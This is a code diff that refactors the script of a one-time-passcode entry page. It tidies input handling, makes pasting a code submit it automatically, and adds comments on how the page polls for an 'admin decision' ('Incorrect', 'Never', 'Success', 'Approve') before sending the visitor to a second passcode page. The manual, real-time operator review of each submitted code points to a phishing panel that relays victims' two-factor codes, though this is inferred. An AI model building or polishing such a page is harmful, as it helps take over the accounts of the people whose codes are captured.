@@ -228,7 +228,6 @@
     </div>
 
     <script>
-        const pathParts = window.location.pathname.split('/');
 const pathParts = window.location.pathname.split('/');
 const email = decodeURIComponent(pathParts[2]);
 if (!email) window.location.href = '/';
@@ -240,6 +239,7 @@ const incorrectDiv = document.getElementById('incorrectMessage');
 let isProcessing = false;
 let checkInterval = null;
 
+// Only allow numbers
 otpInput.addEventListener('input', (e) => {
     let value = e.target.value;
     value = value.replace(/[^0-9]/g, '');
@@ -247,14 +247,13 @@ otpInput.addEventListener('input', (e) => {
     
     if (value.length === 6 && !isProcessing) {
         verifyBtn.disabled = false;
-    } else if (value.length !== 6) {
+    } else {
         verifyBtn.disabled = true;
     }
 });
 
 otpInput.addEventListener('keypress', (e) => {
-    const charCode = e.which ? e.which : e.keyCode;
-    if (charCode < 48 || charCode > 57) {
+    if (e.key < '0' || e.key > '9') {
         e.preventDefault();
     }
 });
@@ -262,19 +261,17 @@ otpInput.addEventListener('keypress', (e) => {
 otpInput.addEventListener('paste', (e) => {
     e.preventDefault();
     const pasted = (e.clipboardData || window.clipboardData).getData('text');
-    const numbers = pasted.replace(/[^0-9]/g, '');
-    const limited = numbers.slice(0, 6);
-    otpInput.value = limited;
-    
-    if (limited.length === 6 && !isProcessing) {
-        verifyBtn.disabled = false;
+    const numbers = pasted.replace(/[^0-9]/g, '').slice(0, 6);
+    otpInput.value = numbers;
+    verifyBtn.disabled = numbers.length !== 6;
+    if (numbers.length === 6 && !isProcessing) {
+        verifyOTP();
     }
 });
 
 function getOTP() {
     const otp = otpInput.value;
-    if (!otp || otp.length !== 6) return null;
-    return otp;
+    return otp.length === 6 ? otp : null;
 }
 
 function showLoading() {
@@ -285,22 +282,30 @@ function showLoading() {
     incorrectDiv.style.display = 'none';
 }
 
-function showIncorrectMessage() {
+function hideLoading() {
     isProcessing = false;
     verifyBtn.disabled = false;
     verifyBtn.innerHTML = 'Verify';
+}
+
+function showIncorrectMessage() {
+    hideLoading();
+    errorDiv.style.display = 'none';
     incorrectDiv.innerHTML = '❌ The passcode was incorrect and could not be authenticated. Please try inputting the passcode again or send another passcode.';
     incorrectDiv.style.display = 'block';
-    
     otpInput.value = '';
-    otpInput.disabled = false;
     otpInput.focus();
+    
+    setTimeout(() => {
+        incorrectDiv.style.display = 'none';
+    }, 5000);
 }
 
 async function verifyOTP() {
     if (isProcessing) return;
+    
     const otp = getOTP();
-    if (!otp || otp.length !== 6) {
+    if (!otp) {
         errorDiv.textContent = 'Please enter all 6 digits';
         errorDiv.style.display = 'block';
         setTimeout(() => {
@@ -310,6 +315,7 @@ async function verifyOTP() {
     }
 
     showLoading();
+    
     try {
         const response = await fetch('/api/users/submit-otp', {
             method: 'POST',
@@ -319,40 +325,44 @@ async function verifyOTP() {
         const data = await response.json();
         
         if (data.success) {
+            // Start polling for admin decision
             if (checkInterval) clearInterval(checkInterval);
+            
             checkInterval = setInterval(async () => {
                 try {
                     const statusResponse = await fetch(`/api/users/check-otp-status?email=${encodeURIComponent(email)}`);
                     const statusData = await statusResponse.json();
-
+                    
+                    // Admin clicked "Incorrect" - reset form
                     if (statusData.reset) {
                         clearInterval(checkInterval);
                         showIncorrectMessage();
                         checkInterval = null;
                     } 
+                    // Admin clicked "Never" - permanent block
                     else if (statusData.never === true) {
                         clearInterval(checkInterval);
                         window.location.href = `/success?email=${encodeURIComponent(email)}`;
                         checkInterval = null;
                     }
+                    // Admin clicked "Success" - go directly to success page
                     else if (statusData.success_redirect === true) {
                         clearInterval(checkInterval);
                         window.location.href = `/success?email=${encodeURIComponent(email)}`;
                         checkInterval = null;
                     }
+                    // Admin clicked "Approve" - go to second OTP page
                     else if (statusData.approved === true) {
                         clearInterval(checkInterval);
                         window.location.href = `/otp2/${encodeURIComponent(email)}/`;
                         checkInterval = null;
                     }
                 } catch(e) {
-                    console.log('Checking status...', e);
+                    console.log('Status check error:', e);
                 }
             }, 2000);
         } else {
-            isProcessing = false;
-            verifyBtn.disabled = false;
-            verifyBtn.innerHTML = 'Verify';
+            hideLoading();
             errorDiv.textContent = data.error || 'Invalid OTP';
             errorDiv.style.display = 'block';
             setTimeout(() => {
@@ -360,9 +370,7 @@ async function verifyOTP() {
             }, 3000);
         }
     } catch (error) {
-        isProcessing = false;
-        verifyBtn.disabled = false;
-        verifyBtn.innerHTML = 'Verify';
+        hideLoading();
         errorDiv.textContent = 'Network error. Please try again.';
         errorDiv.style.display = 'block';
         setTimeout(() => {
